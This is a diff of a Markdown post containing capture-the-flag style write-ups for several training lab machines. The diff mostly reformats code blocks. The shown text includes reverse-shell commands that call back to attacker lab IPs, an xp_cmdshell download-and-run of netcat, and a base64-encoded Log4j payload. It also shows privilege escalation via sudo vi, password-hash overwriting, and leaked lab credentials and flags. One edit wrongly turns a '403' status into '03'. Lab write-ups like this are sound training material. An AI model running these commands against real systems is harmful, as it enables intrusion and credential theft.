@@ -16,7 +16,7 @@ cover:
 ## Archetype
 
 ### nmap
-```
+```sh
 # Nmap 7.92 scan initiated Wed Nov  2 14:28:03 2022 as: nmap -sC -sV -oA nmap/archetype 10.129.91.127
 Nmap scan report for 10.129.91.127
 Host is up (0.074s latency).
@@ -75,7 +75,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 ### smb
 `smb` is open so: 
 ```shell {linenos=false}
-$ smbclient -N -L 10.129.91.127
+smbclient -N -L 10.129.91.127
 ```
 
 *command tags:*
@@ -85,13 +85,13 @@ $ smbclient -N -L 10.129.91.127
 We can connect to the `backups` service without a password via: 
 
 ```shell {linenos=false}
-$ smbclient \\\\10.129.91.127\\backups
+smbclient \\\\10.129.91.127\\backups
 ```
 
 The only file housed here is `prod.dtsConfig`.
 
 *file: prod.dtsConfig*
-```
+```txt
 <DTSConfiguration>
     <DTSConfigurationHeading>
         <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
@@ -104,7 +104,7 @@ The only file housed here is `prod.dtsConfig`.
 
 Noteably, this file leaks us 
 
-```{linenos=false}
+```txt {linenos=false}
 Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;
 ```
 
@@ -112,21 +112,21 @@ Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;
 Attempting to connect to sql database using `mysql`:
 
 ```shell {linenos=false}
-$ mysql -h 10.129.91.127 --port=1433 -u sql_svc -pM3g4c0rp123
+mysql -h 10.129.91.127 --port=1433 -u sql_svc -pM3g4c0rp123
 ```
 
 After trying a couple variations of this, I realized that another tool maybe needed to connect to the `db`. [This link](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server) mentioned `mssqlclient.py`. I ran `locate mssqlclient.py` to search kali for the script.
 
 Connect via: 
 ```shell {linenos=false}
-$ python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py -windows-auth ARCHETYPE/sql_svc@10.129.91.127
+python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py -windows-auth ARCHETYPE/sql_svc@10.129.91.127
 ```
 
 ![mssqlclient](/img/tier2/mssqlclient.png)
 
 Then I used the [previous link](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server) as well as this [cheatsheet](https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet) for `sql` commands. Generating command execution seems good:
 
-```{linenos=false}
+```txt {linenos=false}
 EXEC xp_cmdshell 'net user'; — privOn MSSQL 2005 you may need to reactivate xp_cmdshell first as it’s disabled by default:
 EXEC sp_configure 'show advanced options', 1; — priv
 RECONFIGURE; — priv
@@ -141,25 +141,25 @@ Then I tried several one-liner reverse shells for powershell, but didn't have an
 
 To host this file to the box: 
 ```shell {linenos=false}
-$ python3 -m http.server
+python3 -m http.server
 ```
 
 Additionally, start `nc` locally for the reverse shell: 
 ```shell {linenos=false}
-$ nc -lvnp 1337
+nc -lvnp 1337
 ```
 
 Download the binary and run: 
 
 ```shell {linenos=false}
-$ xp_cmdshell "powershell.exe cd c:\Users\Public; wget http://10.10.14.232:8000/nc64.exe -outfile nc64.exe; .\nc64.exe -e cmd.exe 10.10.14.232 1337"
+xp_cmdshell "powershell.exe cd c:\Users\Public; wget http://10.10.14.232:8000/nc64.exe -outfile nc64.exe; .\nc64.exe -e cmd.exe 10.10.14.232 1337"
 ```
 
 ![rs](/img/tier2/rs.png)
 
 After a bit of poking around, I found this:
 
-```{linenos=false}
+```txt {linenos=false}
     Directory: C:\Users\sql_svc\Desktop
                                                                                   
                                          
@@ -180,7 +180,7 @@ Now we can look into becoming `root`. One great tool for automating this process
 
 As I was scrolling through the output, a few things stood out:
 
-```{linenos=false}
+```txt {linenos=false}
 ͹ Enumerating Security Packages Credentials                                       
   Version:NetNTLMv2                                               
   Hash: sql_svc::ARCHETYPE:1122334455667788:947576aa2fadb0cbbee6e345caee3fc6:0101000000000000ec105ee002efd8013a4c4936e65e1a2e0000000008003000300000000000000000000000003000004961ea35a68c9880c3eabe5d1edabb04866d05ca16c6fe9706906f3be985311d0a00100000000000000000000000000000000000090000000000000000000000 
@@ -191,7 +191,7 @@ As I was scrolling through the output, a few things stood out:
 I decided to check the console history first:
 
 ```shell {linenos=false}
-$ type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline/ConsoleHost_history.txt
+type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline/ConsoleHost_history.txt
 ```
 
 *file: ConsoleHost_history.txt*
@@ -203,7 +203,7 @@ exit
 Now we can revert back to `impacket` tools and use `psexec.py`:
 
 ```shell {linenos=false}
-$ python3 /usr/share/doc/python3-impacket/examples/psexec.py administrator:MEGACORP_4dm1n\!\!@10.129.91.127
+python3 /usr/share/doc/python3-impacket/examples/psexec.py administrator:MEGACORP_4dm1n\!\!@10.129.91.127
 ```
 
 ![root](/img/tier2/root.png)
@@ -211,7 +211,7 @@ $ python3 /usr/share/doc/python3-impacket/examples/psexec.py administrator:MEGAC
 Finally, print out the flag.
 
 ```shell {linenos=false}
-$ type C:\Users\Administrator\Desktop\root.txt
+type C:\Users\Administrator\Desktop\root.txt
 ```
 
 ### Questions
@@ -255,11 +255,11 @@ Start with `http`. Off the bat, I noticed that `megacorp.com` is likely their do
 
 Time for `gobuster`:
 ```shell {linenos=false}
-$ sudo gobuster dir -u http://10.129.28.128 -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -o gobuster.out -z
+sudo gobuster dir -u http://10.129.28.128 -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -o gobuster.out -z
 ...
 /images               (Status: 301) [Size: 315] [--> http://10.129.28.128/images/]
 /.html                (Status: 403) [Size: 278]
-/.php                 (Status: 403) [Size: 278]
+/.php                 (Status: 03) [Size: 278]
 /js                   (Status: 301) [Size: 311] [--> http://10.129.28.128/js/]
 /themes               (Status: 301) [Size: 315] [--> http://10.129.28.128/themes/]
 /css                  (Status: 301) [Size: 312] [--> http://10.129.28.128/css/]
@@ -326,11 +326,11 @@ f2c74ee8db7983851ab2a96a44eb7981
 ```
 
 ```shell {linenos=false}
-$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+python3 -c 'import pty;pty.spawn("/bin/bash")'
 ``` 
 The above command gives us a functional shell 
 ```shell {linenos=false}
-$ export TERM=xterm 
+export TERM=xterm 
 ```
 The above command lets us clear the screen.
 
@@ -360,7 +360,7 @@ On the first look through, the `bugtracker` group stood out - especially since t
 `ltrace` is a tool that allows you to run a binary and see the libraries that are being called. This will help give us a better idea of what is going on under the hood.
 
 ```shell {linenos=false}
-$ ltrace /usr/bin/bugtracker
+ltrace /usr/bin/bugtracker
 ```
 The above command gives us the output:
 
@@ -433,11 +433,11 @@ Service detection performed. Please report any incorrect results at https://nmap
 `ftp` is open on `port 21` and anonymous mode is enabled. Found a file named `backup.zip`, however the files are password protected on unzipping. `john` has a tool called `zip2john` that can allow us to convert his file to hash, and ultimately try to crack it.
 
 ```shell {linenos=false}
-$ zip2john backup.zip > zip.hash
+zip2john backup.zip > zip.hash
 ```
 
 ```shell {linenos=false}
-$ john -w=/usr/share/wordlists/rockyou.txt zip.hash
+john -w=/usr/share/wordlists/rockyou.txt zip.hash
 ...
 backup.zip:741852963::backup.zip:style.css, index.php:backup.zip
 
@@ -449,7 +449,7 @@ Taking a look into `index.php` gives us some password information:
 
 ![index.php](/img/tier2/index.php.png)
 
-```{linenos=false}
+```txt {linenos=false}
 hash_md5(???) = "2cb42f8734ea607eefed3b70af13bbd3"
 ```
 
@@ -467,7 +467,7 @@ Now lets try the credentials we found `admin:qwerty789`
 After looking around, the only thing that seemed potentially vulnerable on the webpage was the `search` feature. This could be injectible via `sqlmap`. I first threw the website into `burpsuite`, copied the `GET` request of the search, and then saved this to a file called `get.request`.
 
 ```shell {linenos=false}
-$ sqlmap -r get.request -p search
+sqlmap -r get.request -p search
 ```
 
 ![sqlmap](/img/tier2/sqlmap.png)
@@ -475,7 +475,7 @@ $ sqlmap -r get.request -p search
 From here, I started looking around the databases.
 
 ```shell {linenos=false}
-$ sqlmap -r get.request -p search --search -C 'password'
+sqlmap -r get.request -p search --search -C 'password'
 ```
 
 ![dbs](/img/tier2/dbs.png)
@@ -487,13 +487,13 @@ There could be valuable columns in `pg_catalog`, but I noticed a command flag ca
 Time for a reverse shell - I just found [these payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash-tcp) for bash.
 
 ```shell {linenos=false}
-$ bash -c "bash -i >& /dev/tcp/10.10.14.66/1337 0>&1"
+bash -c "bash -i >& /dev/tcp/10.10.14.66/1337 0>&1"
 ```
 
 I then used [pwncat](https://github.com/calebstewart/pwncat) to help keep a stable shell and listen on port `1337`.
 
 ```shell {linenos=false}
-$ find / -name user.txt 2>/dev/null
+find / -name user.txt 2>/dev/null
 ```
 
 *file: user.txt*
@@ -505,7 +505,7 @@ ec9b13ca4d6229cd5cc1e09980965bf7
 When starting privesc, I found something valuable for `ssh` (Secure Shell).
 
 ```shell {linenos=false}
-$ cd /; grep -R password
+cd /; grep -R password
 ```
 
 ![grep](/img/tier2/grep.png)
@@ -513,7 +513,7 @@ $ cd /; grep -R password
 Looks like we can now `ssh` into the server directly instead of hosting an unstable reverse shell.
 
 ```shell {linenos=false}
-$ ssh postgres@10.129.199.211` 
+ssh postgres@10.129.199.211` 
 (P@s5w0rd!)
 ```
 
@@ -528,10 +528,10 @@ We can then try to escalate privs. Let's start with the basics like `id` and `su
 Looks like we can edit `pg_hba.conf` with `sudo` privs by using `vi`. So I tried the [basic payload](https://gtfobins.github.io/gtfobins/vi/#sudo) to get a shell. 
 
 ```shell {linenos=false}
-$ sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
+sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
 ```
 
-```{linenos=false}
+```vim{linenos=false}
 (in vi)
 :set shell=/bin/sh`
 
@@ -556,7 +556,7 @@ $ sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
 ## Unified
 
 ### nmap
-```
+```sh
 # Nmap 7.92 scan initiated Fri Nov  4 22:29:03 2022 as: nmap -sC -sV -oA nmap/unified -T4 10.129.186.136
 Nmap scan report for 10.129.186.136
 Host is up (0.073s latency).
@@ -631,7 +631,7 @@ industry standard application protocol for accessing and maintaining distributed
 ***Important note:*** you must remove the spaces from the command listed in the [above writeup](https://www.sprocketsecurity.com/resources/another-log4j-on-the-fire-unifi) in order to succesfully get a reverse shell:
 
 ```shell {linenos=false}
-$ java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMjUvNDQ0NCAwPiYxCg==}|{base64,-d}|{bash,-i}" --hostname "10.10.14.25"
+java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMjUvNDQ0NCAwPiYxCg==}|{base64,-d}|{bash,-i}" --hostname "10.10.14.25"
 ```
 
 ![pwncat](/img/tier2/pwncat.png)
@@ -654,7 +654,7 @@ $6$dDywalcPwNgl3LkM$Ex3SObZFkVQ5kMk4/Cmur7I9qDDKOyLNLrYbHGqt0JGz49G8fRb9KIAvFMS3
 Looking through the `ace` database for the `administrator` user.
 
 ```shell {linenos=false}
-$ mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
+mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
 ```
 
 ![db](/img/tier2/db.png)
@@ -662,7 +662,7 @@ $ mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
 To update `administrator`'s password to `unified`, we simply need to run:
 
 ```shell {linenos=false}
-$ mongo --port 27117 ace --eval 'db.admin.update({"_id": ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"$6$dDywalcPwNgl3LkM$Ex3SObZFkVQ5kMk4Cmur7I9qDDKOyLNLrYbHGqt0JGz49G8fRb9KIAvFMS3AS8jGuOU/4nY5H5OtNq9/Qmpl1"}})'
+mongo --port 27117 ace --eval 'db.admin.update({"_id": ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"$6$dDywalcPwNgl3LkM$Ex3SObZFkVQ5kMk4Cmur7I9qDDKOyLNLrYbHGqt0JGz49G8fRb9KIAvFMS3AS8jGuOU/4nY5H5OtNq9/Qmpl1"}})'
 ```
 
 ![admin](/img/tier2/admin.png)
@@ -677,7 +677,7 @@ And undersettings there's some valuable information!
 Then just:
 
 ```shell {linenos=false}
-$ ssh root@10.129.186.136
+ssh root@10.129.186.136
 ```
 ...and get the flag :smirk:
 
